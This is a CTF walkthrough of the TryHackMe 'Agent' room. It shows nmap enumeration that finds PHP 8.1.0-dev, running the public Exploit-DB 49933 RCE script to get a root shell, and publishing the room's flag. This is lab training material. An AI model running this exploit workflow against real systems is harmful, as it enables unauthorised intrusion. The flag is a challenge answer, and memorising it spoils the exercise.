# Agent T 

**Platform:** TryHackMe  
**Date:** 2026-08-25  
**Difficulty:** Easy  
**Category:** Linux / Web / RCE  
**Room URL:** [TryHackMe — Agent](https://tryhackme.com/room/agent?utm_source=chatgpt.com)  
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

This room was basically a lesson in why **version enumeration matters**.

The target was running a development version of PHP, and Nmap immediately gave me a pretty interesting version:

```text
PHP 8.1.0-dev
```

Instead of spending forever trying to find hidden directories, I decided to investigate that version.

And yep... it had a **Remote Code Execution vulnerability**. :)

The exploit gave me a shell on the machine, and when I checked my privileges...

**I was already root.** 😂

So this room was basically:

**Nmap → identify vulnerable PHP version → exploit RCE → root → flag.**

---

# 🔍 Reconnaissance

As always, first things first:

### Nmap

```bash
nmap -sV 10.130.152.242
```

The scan returned:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: Month Dashboard
```

So we had:

|Port|Service|Version|
|---|---|---|
|`80/tcp`|HTTP|PHP 8.1.0-dev|

There was only **one open port**, so the web server was obviously going to be the main attack surface.

And the `PHP 8.1.0-dev` part immediately caught my attention.

> **Development version of PHP? Hmm... that's interesting. 👀**

---

# 🧭 Steps I Took

## Step 1 — Checking the Web Server

I opened the target in my browser:

```text
http://10.130.152.242
```

The page showed an **Admin Dashboard**.

Nothing immediately jumped out at me, so I tried some directory enumeration with Gobuster.

```bash
gobuster dir -u http://10.130.152.242 \
-w /usr/share/wordlists/dirb/common.txt
```

But Gobuster wasn't very happy.

It reported that basically every random path was returning a `200 OK`, which made normal directory enumeration unreliable.

Something like:

```text
Error: the server returns a status code that matches the provided options for no existing urls.
```

So rather than wasting time trying to brute-force a web server that was giving me false positives, I went back to the information I already had.

**PHP 8.1.0-dev.**

That looked much more promising.

---

# Step 2 — Searching for the PHP Exploit

I searched for:

```text
PHP 8.1.0-dev exploit
```

And found a known vulnerability involving the PHP development version and the `User-Agent` header.

The exploit was listed as **Exploit-DB 49933**.

I downloaded the exploit and ran it:

```bash
python3 49933.py
```

The exploit asked me for the target URL.

I entered:

```text
http://10.130.152.242
```

And then...

```text
Interactive shell is opened on http://10.130.152.242/
Can't access tty; job control turned off.
```

**LET'S GOOOOO. 😂**

We had command execution.

---

# Step 3 — Checking My Privileges

Whenever I get a shell, one of the first things I want to know is:

**Who am I?**

So:

```bash
whoami
```

Output:

```text
root
```

BRO. 💀

I didn't even need to do privilege escalation.

The RCE had already given me **root access**.

At this point the room was basically finished.

---

# Step 4 — Finding the Flag

I started looking around the filesystem.

```bash
ls
```

Then I checked the parent directory:

```bash
cd ..
ls
```

I also used `find` to locate text files:

```bash
find / -type f -name "*.txt" 2>/dev/null
```

Eventually I found:

```text
flag.txt
```

So I read it:

```bash
cat flag.txt
```

And got:

```text
THM{41f2f7d8f3b8abf16d6d23973e3dfdbecb}
```

**Room completed. 🛡️🔥**

---

# 🛠 Commands Used

|Command|What It Does|
|---|---|
|`nmap -sV 10.130.152.242`|Scans the target and identifies running services and versions|
|`gobuster dir -u ...`|Attempts to discover hidden directories and files|
|`python3 49933.py`|Runs the PHP 8.1.0-dev RCE exploit|
|`ls`|Lists files and directories|
|`cd ..`|Moves to the parent directory|
|`whoami`|Shows the current user|
|`find / -type f -name "*.txt" 2>/dev/null`|Searches the filesystem for `.txt` files|
|`cat flag.txt`|Displays the flag|

---

# 🚩 Flag Found

|Flag|Value|
|---|---|
|**Root Flag**|`THM{41f2f7d8f3b8abf16d6d23973e3dfdbecb}`|

---
